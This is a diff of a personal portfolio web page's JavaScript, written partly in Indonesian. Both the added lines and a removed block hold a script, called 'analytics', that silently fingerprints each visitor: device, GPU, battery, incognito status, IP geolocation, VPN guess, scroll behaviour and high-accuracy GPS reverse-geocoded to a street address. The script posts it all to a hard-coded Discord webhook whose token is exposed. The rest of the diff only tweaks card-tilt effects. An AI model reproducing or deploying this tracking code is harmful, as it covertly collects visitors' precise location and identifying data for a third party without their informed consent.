+  let netInfo = 'Unknown';
+  let downlink = '';
+  let rtt      = '';
+  if(navigator.connection){
+    const c = navigator.connection;
+    netInfo  = c.effectiveType || c.type || 'Unknown';
+    if(c.downlink)  downlink = `${c.downlink} Mbps`;
+    if(c.rtt)       rtt      = `${c.rtt} ms`;
+  }
+
+  const [geo, battery, incognito, detailLoc] = await Promise.all([
+    (async()=>{
+      let g = { ip:'unknown', city:'Unknown', region:'Unknown', country:'Unknown', country_code:'?', postal:'Unknown', org:'Unknown', asn:'Unknown' };
+      try {
+        const ctrl = new AbortController();
+        const tid = setTimeout(()=> ctrl.abort(), 5000);
+        const res = await fetch('https://ipapi.co/json/', { signal: ctrl.signal });
+        clearTimeout(tid);
+        if(res.ok){
+          const d = await res.json();
+          g.ip           = d.ip           || 'unknown';
+          g.city         = d.city         || 'Unknown';
+          g.region       = d.region       || 'Unknown';
+          g.country      = d.country_name || 'Unknown';
+          g.country_code = d.country_code || '?';
+          g.postal       = d.postal       || 'Unknown';
+          g.org          = d.org          || 'Unknown';
+          g.asn          = d.asn          || 'Unknown';
+        }
+      } catch(e){}
+      return g;
+    })(),
+    getBattery(),
+    detectIncognito(),
+    getDetailedLocation()
+  ]);
+
+  const fields1 = [
+    { name:'📱 Device',        value: `${deviceInfo.vendor} ${deviceInfo.model}`.trim() || 'Unknown', inline: true },
+    { name:'💻 Type',          value: deviceType, inline: true },
+    { name:'🖥️ OS',            value: deviceInfo.osVer || os, inline: true },
+    { name:'🌐 Browser',       value: deviceInfo.browserVer || browser, inline: true },
+    { name:'⚙️ CPU Cores',     value: String(cpuCores), inline: true },
+    { name:'🧠 RAM',           value: ramGB, inline: true },
+  ];
+  if(battery) fields1.push({ name:'🔋 Battery', value: battery, inline: true });
+  fields1.push(
+    { name:'📐 Resolution',    value: scr, inline: true },
+    { name:'🪟 Viewport',      value: viewport, inline: true },
+    { name:'🔍 Pixel Ratio',   value: `${dpr}x`, inline: true },
+    { name:'🔄 Orientation',   value: orientation, inline: true },
+    { name:'👆 Touch',         value: touchSupport, inline: true },
+    { name:'🎨 Color Scheme',  value: colorScheme, inline: true },
+    { name:'⚡ Connection',    value: netInfo, inline: true },
+    { name:'📶 Downlink',      value: downlink || 'N/A', inline: true },
+    { name:'📡 RTT Latency',   value: rtt || 'N/A', inline: true },
+    { name:'🔒 Incognito',     value: incognito, inline: true },
+    { name:'🍪 Cookies',       value: cookieEnabled, inline: true },
+    { name:'🚫 Do Not Track',  value: doNotTrack, inline: true },
+    { name:'🗣️ Language',      value: langs, inline: true },
+    { name:'🌏 Timezone',      value: tz, inline: true },
+    { name:'🕒 Local Time',    value: localTime, inline: true },
+    { name:'🔗 Referrer',      value: referrer.length > 60 ? referrer.slice(0,60)+'…' : referrer, inline: false },
+    { name:'📄 Page',          value: pageUrl.length > 80 ? pageUrl.slice(0,80)+'…' : pageUrl, inline: false },
+  );
+
+  const embed1 = {
+    title: '🛸 BETA PORTFOLIO — Visitor Detected',
+    color: 0x7c6af7,
+    description: `Visitor baru masuk pada **${localTime}**`,
+    fields: fields1,
+    footer: { text: `BETA Analytics v2  •  ${deviceType} • ${deviceInfo.osVer || os}` },
+    timestamp: new Date().toISOString()
+  };
+
+  const fields2 = [
+    { name:'🆔 IP Address',    value: `\`${geo.ip}\``, inline: false },
+    { name:'🏢 ISP / Org',     value: geo.org, inline: true },
+    { name:'🔢 ASN',           value: geo.asn, inline: true },
+    { name:'🌍 Lokasi (IP)',    value: `${geo.city}, ${geo.region}, ${geo.country} (${geo.country_code})`, inline: false },
+    { name:'📮 Kode Pos',      value: geo.postal, inline: true },
+  ];
+
+  if(detailLoc){
+    const mapsUrl = `https://www.google.com/maps?q=${detailLoc.lat},${detailLoc.lon}`;
+    const alamat  = [detailLoc.jalan, detailLoc.kelurahan, detailLoc.kecamatan, detailLoc.kota, detailLoc.negara]
+                    .filter(Boolean).join(', ') || 'Tidak tersedia';
+    fields2.push(
+      { name:'📍 Alamat GPS',   value: alamat, inline: false },
+      { name:'🗺️ Koordinat',    value: `\`${detailLoc.lat.toFixed(6)}, ${detailLoc.lon.toFixed(6)}\``, inline: true },
+      { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`, inline: true },
+      { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`, inline: true },
+    );
+  } else {
+    fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
+  }
+
+  const embed2 = {
+    title: '🌍 Lokasi & Jaringan',
+    color: 0x22d3ee,
+    fields: fields2,
+    footer: { text: `IP: ${geo.ip}  •  ${geo.country}` },
+    timestamp: new Date().toISOString()
+  };
+
+  try {
+    const params = new URLSearchParams();
+    params.append('payload_json', JSON.stringify({ embeds: [embed1, embed2] }));
+    await fetch(WEBHOOK + '?wait=true', {
+      method: 'POST',
+      body: params
+    });
+  } catch(err) {
+    console.warn('Analytics webhook failed:', err);
+  }
+})();
 
 console.log('%c Hi there! 👋 %c by RISKI RM',
   'font-size:1.8em;font-weight:900;color:#a78bfa;background:#03050f;padding:4px 12px;border-radius:4px',
   'font-size:1em;color:#22d3ee;background:#03050f;padding:4px 8px;border-radius:4px');
 
 function initTilt(){
+  /* Touch device: skip tilt, pakai tap flash ringan saja */
   const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
   document.querySelectorAll('.glass-card').forEach(card => {
@@ -1478,21 +1757,20 @@ function initTilt(){
         const cy = rect.top + rect.height / 2;
         const dx = (tX - cx) / (rect.width / 2);
         const dy = (tY - cy) / (rect.height / 2);
-        const tiltX = dy * -10;
-        const tiltY = dx * 10;
-        card.style.transition = 'transform 0.12s ease-out, box-shadow 0.12s ease-out, border-color 0.12s ease-out';
-        card.style.transform = `perspective(700px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-5px) scale(1.02)`;
+        const tiltX = dy * -18;
+        const tiltY = dx * 18;
+        card.style.transform = `perspective(600px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-8px) scale(1.03)`;
         card.style.boxShadow = [
-          `${-tiltY*1.8}px ${tiltX*1.8}px 32px rgba(${r},${g},${b},0.38)`,
-          `0 0 20px rgba(${r},${g},${b},0.2)`,
-          `0 12px 36px rgba(0,0,0,0.4)`
+          `${-tiltY*2.5}px ${tiltX*2.5}px 40px rgba(${r},${g},${b},0.5)`,
+          `0 0 30px rgba(${r},${g},${b},0.3)`,
+          `0 16px 50px rgba(0,0,0,0.5)`
         ].join(', ');
-        card.style.borderColor = `rgba(${r},${g},${b},0.45)`;
+        card.style.borderColor = `rgba(${r},${g},${b},0.55)`;
         const shine = card.querySelector('.tilt-shine');
         if(shine){
           const px = ((tX - rect.left) / rect.width) * 100;
           const py = ((tY - rect.top) / rect.height) * 100;
-          shine.style.background = `radial-gradient(circle at ${px}% ${py}%, rgba(255,255,255,0.18), transparent 60%)`;
+          shine.style.background = `radial-gradient(circle at ${px}% ${py}%, rgba(255,255,255,0.22), transparent 60%)`;
           shine.style.opacity = '1';
         }
         tRaf = null;
@@ -1500,7 +1778,6 @@ function initTilt(){
 
       function resetTouchTilt(){
         if(tRaf){ cancelAnimationFrame(tRaf); tRaf = null; }
-        card.style.transition = 'transform 0.4s cubic-bezier(.2,.8,.2,1), box-shadow 0.4s ease, border-color 0.4s ease';
         card.style.transform = '';
         card.style.boxShadow = '';
         card.style.borderColor = '';
@@ -1525,7 +1802,7 @@ function initTilt(){
       return;
     }
 
-// init m
+    /* Desktop mouse tilt */
     function getCardColor(){
       const badge = card.querySelector('.proj-badge');
       if(badge){ const cs = getComputedStyle(badge); return cs.color; }
@@ -1604,379 +1881,10 @@ function initTilt(){
 }
 setTimeout(initTilt, 800);
 
-})();
-</script>
+/* ── IAB Detection & Redirect ────────────────────────────── */
+/* Sudah ditangani oleh IAB Guard di paling atas <head>.      */
+/* Script lama ini dinonaktifkan untuk mencegah konflik.       */
 
-
-<script>
-(async function sendAnalytics(){
-  const WEBHOOK = 'https://discord.com/api/webhooks/1512402866432901180/fQcOarEO-BJ73H_sak3D-Y1ZBIPPeBOze-FG9m-vzIRPDkEfofe7Cq9RRqPxXt-GWC3N';
-
-  if(sessionStorage.getItem('beta_analytics_sent')) return;
-  sessionStorage.setItem('beta_analytics_sent', 'true');
-
-  const pageEnterTime = Date.now();
-
-  const _uaRaw = navigator.userAgent || '';
-  const _iabMap = [
-    [/Instagram/i,      'Instagram'],
-    [/FBAN|FBAV/i,      'Facebook'],
-    [/TikTok|musical_ly|BytedanceWebview|aweme/i, 'TikTok'],
-    [/Snapchat/i,       'Snapchat'],
-    [/Line\//i,         'LINE'],
-    [/WhatsApp/i,       'WhatsApp'],
-    [/TwitterAndroid|Twitter for/i, 'Twitter/X'],
-    [/LinkedInApp/i,    'LinkedIn'],
-    [/Pinterest/i,      'Pinterest'],
-    [/Telegram/i,       'Telegram'],
-    [/MicroMessenger/i, 'WeChat'],
-    [/GSA/i,            'Google App'],
-  ];
-  let iabName = null;
-  for(const [rx, name] of _iabMap){ if(rx.test(_uaRaw)){ iabName = name; break; } }
-
-  // init s
-  let maxScroll = 0;
-  function updateScroll(){
-    const total = document.documentElement.scrollHeight - window.innerHeight;
-    if(total > 0) maxScroll = Math.max(maxScroll, Math.round((window.scrollY / total) * 100));
-  }
-  window.addEventListener('scroll', updateScroll, { passive: true });
-
-  // init d
-  function getDeviceInfo(){
-    try {
-      const parser = new UAParser();
-      const result = parser.getResult();
-      const ua = navigator.userAgent;
-      let model  = result.device.model  || '';
-      let vendor = result.device.vendor || '';
-      if(!model){
-        const patterns = [
-          [/iPhone/i,           'iPhone'],
-          [/iPad/i,             'iPad'],
-          [/(SM-[A-Z0-9]+)/i,   m => m[1]],
-          [/(Pixel \d[a-z]*)/i, m => m[1]],
-          [/(POCO [A-Z0-9]+)/i, m => m[1]],
-          [/(Redmi [A-Z0-9]+)/i,m => m[1]],
-          [/(OPPO [A-Z0-9]+)/i, m => m[1]],
-          [/(vivo [A-Z0-9]+)/i, m => m[1]],
-          [/(OnePlus [A-Z0-9]+)/i, m => m[1]],
-          [/(Realme [A-Z0-9]+)/i,  m => m[1]],
-        ];
-        for(const [rx, val] of patterns){
-          const m = ua.match(rx);
-          if(m){ model = typeof val === 'function' ? val(m) : val; break; }
-        }
-      }
-      if(!vendor && model){
-        if(/iPhone|iPad|Mac/i.test(model))      vendor = 'Apple';
-        else if(/SM-/i.test(model))             vendor = 'Samsung';
-        else if(/Pixel/i.test(model))           vendor = 'Google';
-        else if(/POCO|Redmi/i.test(model))      vendor = 'Xiaomi';
-        else if(/OPPO/i.test(model))            vendor = 'OPPO';
-        else if(/vivo/i.test(model))            vendor = 'Vivo';
-        else if(/OnePlus/i.test(model))         vendor = 'OnePlus';
-        else if(/Realme/i.test(model))          vendor = 'Realme';
-      }
-      let osVer = '';
-      const avMatch  = ua.match(/Android ([\d.]+)/i);
-      const iosMatch = ua.match(/OS ([\d_]+) like Mac/i);
-      const winMatch = ua.match(/Windows NT ([\d.]+)/i);
-      const macMatch = ua.match(/Mac OS X ([\d_]+)/i);
-      if(avMatch)       osVer = `Android ${avMatch[1]}`;
-      else if(iosMatch) osVer = `iOS ${iosMatch[1].replace(/_/g,'.')}`;
-      else if(winMatch){
-        const map = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7','6.0':'Vista'};
-        osVer = `Windows ${map[winMatch[1]] || winMatch[1]}`;
-      }
-      else if(macMatch) osVer = `macOS ${macMatch[1].replace(/_/g,'.')}`;
-      let browserVer = '';
-      const edM = ua.match(/Edg\/([\d.]+)/i);
-      const cvM = ua.match(/Chrome\/([\d.]+)/i);
-      const ffM = ua.match(/Firefox\/([\d.]+)/i);
-      const sfM = ua.match(/Version\/([\d.]+).*Safari/i);
-      const oprM= ua.match(/OPR\/([\d.]+)/i);
-      if(edM)       browserVer = `Edge ${edM[1].split('.')[0]}`;
-      else if(oprM) browserVer = `Opera ${oprM[1].split('.')[0]}`;
-      else if(cvM)  browserVer = `Chrome ${cvM[1].split('.')[0]}`;
-      else if(ffM)  browserVer = `Firefox ${ffM[1].split('.')[0]}`;
-      else if(sfM)  browserVer = `Safari ${sfM[1]}`;
-      return {
-        model:      model      || 'Unknown',
-        vendor:     vendor     || 'Unknown',
-        type:       result.device.type || 'desktop',
-        osVer:      osVer      || 'Unknown',
-        browserVer: browserVer || 'Unknown'
-      };
-    } catch(e){
-      return { model:'Unknown', vendor:'Unknown', type:'desktop', osVer:'Unknown', browserVer:'Unknown' };
-    }
-  }
-
-  async function getBattery(){
-    try {
-      if(!navigator.getBattery) return 'N/A (not supported)';
-      const bat = await navigator.getBattery();
-      const pct = Math.round(bat.level * 100);
-      const chg = bat.charging ? '⚡ Charging' : '🔋 Not charging';
-      const timeLeft = bat.charging
-        ? (bat.chargingTime !== Infinity ? `~${Math.round(bat.chargingTime/60)}m to full` : '')
-        : (bat.dischargingTime !== Infinity ? `~${Math.round(bat.dischargingTime/60)}m left` : '');
-      return `${pct}% — ${chg}${timeLeft ? ' · ' + timeLeft : ''}`;
-    } catch { return 'N/A (not supported)'; }
-  }
-
-  async function detectIncognito(){
-    try {
-      if(navigator.storage && navigator.storage.estimate){
-        const { quota } = await navigator.storage.estimate();
-          if(quota && quota < 120 * 1024 * 1024) return 'Yes (Private/Incognito)';
-        return 'No (Normal)';
-      }
-      return new Promise(res => {
-        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if(!fs){ res('Unknown'); return; }
-        fs(window.TEMPORARY, 100, ()=> res('No (Normal)'), ()=> res('Yes (Private/Incognito)'));
-      });
-    } catch { return 'Unknown'; }
-  }
-
-  function getGPU(){
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if(!gl) return 'Unknown (WebGL not supported)';
-      const ext = gl.getExtension('WEBGL_debug_renderer_info');
-      if(ext){
-        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'Unknown';
-        const vendor   = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   || 'Unknown';
-        return `${renderer} (${vendor})`;
-      }
-      return gl.getParameter(gl.RENDERER) || 'Unknown';
-    } catch { return 'Unknown'; }
-  }
-
-  async function getDetailedLocation(){
-    return new Promise((resolve)=>{
-      if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
-      sessionStorage.setItem('loc_asked','1');
-      if(!navigator.geolocation){ resolve(null); return; }
-      navigator.geolocation.getCurrentPosition(
-        async (pos)=>{
-          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-          try {
-            const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-            const data = await res.json();
-            if(data && data.address){
-              const a = data.address;
-              resolve({
-                jalan:     a.road || a.pedestrian || a.footway || a.path || '',
-                kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
-                kecamatan: a.city_district || a.district || a.county || '',
-                kota:      a.city || a.town || a.village || a.municipality || '',
-                negara:    a.country || '',
-                postcode:  a.postcode || '',
-                placeId:  `osm:${data.place_id}`,
-                lat, lon, accuracy: Math.round(accuracy)
-              });
-            } else { resolve(null); }
-          } catch { resolve(null); }
-        },
-        ()=> resolve(null),
-        { timeout: 8000, enableHighAccuracy: true }
-      );
-    });
-  }
-
-  const deviceInfo   = getDeviceInfo();
-  const gpuInfo      = getGPU();
-  const ua           = navigator.userAgent || 'Unknown';
-  const langs        = (navigator.languages || [navigator.language]).join(', ') || 'Unknown';
-  const scr          = `${screen.width}×${screen.height}`;
-  const viewport     = `${window.innerWidth}×${window.innerHeight}`;
-  const dpr          = window.devicePixelRatio || 1;
-  const orientation  = screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
-  const tz           = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-  const referrer     = document.referrer || 'Direct';
-  const pageUrl      = window.location.href;
-  const localTime    = new Date().toLocaleString('id-ID', { dateStyle:'full', timeStyle:'medium' });
-  const colorScheme  = window.matchMedia('(prefers-color-scheme: dark)').matches ? '🌑 Dark' : '☀️ Light';
-  const touchSupport = ('ontouchstart' in window || navigator.maxTouchPoints > 0)
-                       ? `Yes (${navigator.maxTouchPoints} points)` : 'No';
-  const cpuCores     = navigator.hardwareConcurrency ? String(navigator.hardwareConcurrency) : 'Unknown';
-  const ramGB        = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-  const doNotTrack   = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
-  const cookieEnabled= navigator.cookieEnabled ? 'Yes' : 'No';
-  const pluginsCount = navigator.plugins?.length != null ? String(navigator.plugins.length) : 'Unknown';
-  const isMobileUA   = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-  const deviceType   = isMobileUA ? 'Mobile' : 'Desktop';
-
-  let browser = 'Unknown';
-  if(/Edg\//i.test(ua))          browser = 'Edge';
-  else if(/OPR\//i.test(ua))     browser = 'Opera';
-  else if(/Firefox\//i.test(ua)) browser = 'Firefox';
-  else if(/Chrome\//i.test(ua))  browser = 'Chrome';
-  else if(/Safari\//i.test(ua))  browser = 'Safari';
-
-  let os = 'Unknown';
-  if(/Windows NT/i.test(ua))           os = 'Windows';
-  else if(/Mac OS X/i.test(ua))        os = 'macOS';
-  else if(/Android/i.test(ua))         os = 'Android';
-  else if(/iOS|iPhone|iPad/i.test(ua)) os = 'iOS';
-  else if(/Linux/i.test(ua))           os = 'Linux';
-
-  let netInfo = 'Unknown', downlink = 'N/A', rtt = 'N/A', saveData = 'Unknown';
-  if(navigator.connection){
-    const c = navigator.connection;
-    netInfo  = c.effectiveType || c.type || 'Unknown';
-    downlink = c.downlink  ? `${c.downlink} Mbps`  : 'N/A';
-    rtt      = c.rtt       ? `${c.rtt} ms`         : 'N/A';
-    saveData = c.saveData  ? 'On (Data Saver)'      : 'Off';
-  }
-
-  let pageLoadMs = 'Unknown';
-  try {
-    const nav = performance.getEntriesByType('navigation')[0];
-    if(nav) pageLoadMs = `${Math.round(nav.loadEventEnd - nav.startTime)} ms`;
-    else if(performance.timing){
-      const t = performance.timing;
-      pageLoadMs = `${t.loadEventEnd - t.navigationStart} ms`;
-    }
-  } catch {}
-
-  const [geo, battery, incognito, detailLoc] = await Promise.all([
-    (async()=>{
-      let g = {
-        ip:'Unknown', city:'Unknown', region:'Unknown',
-        country:'Unknown', country_code:'?',
-        postal:'Unknown', org:'Unknown', asn:'Unknown',
-        latitude:'Unknown', longitude:'Unknown'
-      };
-      try {
-        const ctrl = new AbortController();
-        const tid  = setTimeout(()=> ctrl.abort(), 5000);
-        const res  = await fetch('https://ipapi.co/json/', { signal: ctrl.signal });
-        clearTimeout(tid);
-        if(res.ok){
-          const d = await res.json();
-          g.ip           = d.ip           || 'Unknown';
-          g.city         = d.city         || 'Unknown';
-          g.region       = d.region       || 'Unknown';
-          g.country      = d.country_name || 'Unknown';
-          g.country_code = d.country_code || '?';
-          g.postal       = d.postal       || 'Unknown';
-          g.org          = d.org          || 'Unknown';
-          g.asn          = d.asn          || 'Unknown';
-          g.latitude     = d.latitude     || 'Unknown';
-          g.longitude    = d.longitude    || 'Unknown';
-        }
-      } catch(e){}
-      return g;
-    })(),
-    getBattery(),
-    detectIncognito(),
-    getDetailedLocation()
-  ]);
-
-  const VPN_KEYWORDS = ['cloudflare','digitalocean','amazon','google','microsoft','linode',
-    'vultr','ovh','hetzner','akamai','fastly','mullvad','nordvpn','expressvpn',
-    'protonvpn','ipvanish','datacamp','m247','packethub','hostinger'];
-  const orgLow = (geo.org || '').toLowerCase();
-  const asnLow = (geo.asn || '').toLowerCase();
-  const isVPN  = VPN_KEYWORDS.some(k => orgLow.includes(k) || asnLow.includes(k));
-  const vpnFlag = isVPN ? '⚠️ Possible VPN/Proxy/Datacenter' : '✅ Likely Residential';
-
-  const timeOnPage = `${Math.round((Date.now() - pageEnterTime) / 1000)}s`;
-
-  const fields1 = [
-    { name:'📱 Device',         value: `${deviceInfo.vendor} ${deviceInfo.model}`.trim() || 'Unknown', inline: true },
-    { name:'💻 Type',           value: deviceType,                           inline: true },
-    { name:'🖥️ OS',             value: deviceInfo.osVer || os,               inline: true },
-    { name:'🌐 Browser',        value: deviceInfo.browserVer || browser,     inline: true },
-    { name:'⚙️ CPU Cores',      value: cpuCores,                             inline: true },
-    { name:'🧠 RAM',            value: ramGB,                                inline: true },
-    { name:'🔋 Battery',        value: battery,                              inline: true },
-    ...(iabName ? [{ name:'📲 Sumber',         value: iabName,                              inline: true }] : []),
-    { name:'🎮 GPU',            value: gpuInfo.length > 60 ? gpuInfo.slice(0,60)+'…' : gpuInfo, inline: false },
-    { name:'📐 Resolution',     value: scr,                                  inline: true },
-    { name:'🪟 Viewport',       value: viewport,                             inline: true },
-    { name:'🔍 Pixel Ratio',    value: `${dpr}x`,                            inline: true },
-    { name:'🔄 Orientation',    value: orientation,                          inline: true },
-    { name:'👆 Touch',          value: touchSupport,                         inline: true },
-    { name:'🎨 Color Scheme',   value: colorScheme,                          inline: true },
-    { name:'⚡ Connection',     value: netInfo,                              inline: true },
-    { name:'📶 Downlink',       value: downlink,                             inline: true },
-    { name:'📡 RTT Latency',    value: rtt,                                  inline: true },
-    { name:'💾 Data Saver',     value: saveData,                             inline: true },
-    { name:'🔒 Incognito',      value: incognito,                            inline: true },
-    { name:'🍪 Cookies',        value: cookieEnabled,                        inline: true },
-    { name:'🚫 Do Not Track',   value: doNotTrack,                           inline: true },
-    { name:'🔌 Plugins',        value: pluginsCount,                         inline: true },
-    { name:'🗣️ Language',       value: langs,                                inline: true },
-    { name:'🌏 Timezone',       value: tz,                                   inline: true },
-    { name:'🕒 Local Time',     value: localTime,                            inline: true },
-    { name:'⏱️ Page Load',      value: pageLoadMs,                           inline: true },
-  ];
-
-  const embed1 = {
-    title: '🛸 BETA PORTFOLIO — Visitor Detected',
-    color: 0x7c6af7,
-    description: `Visitor baru masuk pada **${localTime}**`,
-    fields: fields1,
-    footer: { text: `BETA Analytics v3  •  ${deviceType} • ${deviceInfo.osVer || os}` },
-    timestamp: new Date().toISOString()
-  };
-
-  const fields2 = [
-    { name:'🆔 IP Address',     value: `\`${geo.ip}\``,                      inline: false },
-    { name:'🏢 ISP / Org',      value: geo.org,                              inline: true  },
-    { name:'🔢 ASN',            value: geo.asn,                              inline: true  },
-    { name:'🕵️ VPN / Proxy',    value: vpnFlag,                              inline: false },
-    { name:'🌍 Lokasi (IP)',     value: `${geo.city}, ${geo.region}, ${geo.country} (${geo.country_code})`, inline: false },
-    { name:'📮 Kode Pos',       value: geo.postal,                           inline: true  },
-    { name:'🗺️ IP Koordinat',   value: `${geo.latitude}, ${geo.longitude}`,  inline: true  },
-  ];
-
-  if(detailLoc){
-    const mapsUrl = `https://www.google.com/maps?q=${detailLoc.lat},${detailLoc.lon}`;
-    const alamat  = [detailLoc.jalan, detailLoc.kelurahan, detailLoc.kecamatan, detailLoc.kota, detailLoc.negara]
-                    .filter(Boolean).join(', ') || 'Tidak tersedia';
-    fields2.push(
-      { name:'📍 Alamat GPS',   value: alamat,                                                  inline: false },
-      { name:'🗺️ Koordinat',    value: `\`${detailLoc.lat.toFixed(6)}, ${detailLoc.lon.toFixed(6)}\``, inline: true },
-      { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`,                              inline: true  },
-      { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`,                              inline: true  },
-    );
-  } else {
-    fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
-  }
-
-  fields2.push(
-    { name:'📊 Scroll Depth',   value: `${maxScroll}%`,                      inline: true  },
-    { name:'⏳ Time on Page',   value: timeOnPage,                           inline: true  },
-    { name:'🔗 Referrer',       value: referrer.length > 80 ? referrer.slice(0,80)+'…' : referrer, inline: false },
-    { name:'📄 Page URL',       value: pageUrl.length > 80 ? pageUrl.slice(0,80)+'…' : pageUrl,    inline: false },
-  );
-
-  const embed2 = {
-    title: '🌍 Lokasi, Jaringan & Behavior',
-    color: 0x22d3ee,
-    fields: fields2,
-    footer: { text: `IP: ${geo.ip}  •  ${geo.country}  •  ${vpnFlag}` },
-    timestamp: new Date().toISOString()
-  };
-
-  try {
-    const params = new URLSearchParams();
-    params.append('payload_json', JSON.stringify({ embeds: [embed1, embed2] }));
-    await fetch(WEBHOOK + '?wait=true', {
-      method: 'POST',
-      body: params
-    });
-  } catch(err) {
-    console.warn('webhook err:', err);
-  }
 })();
 </script>
 </body>
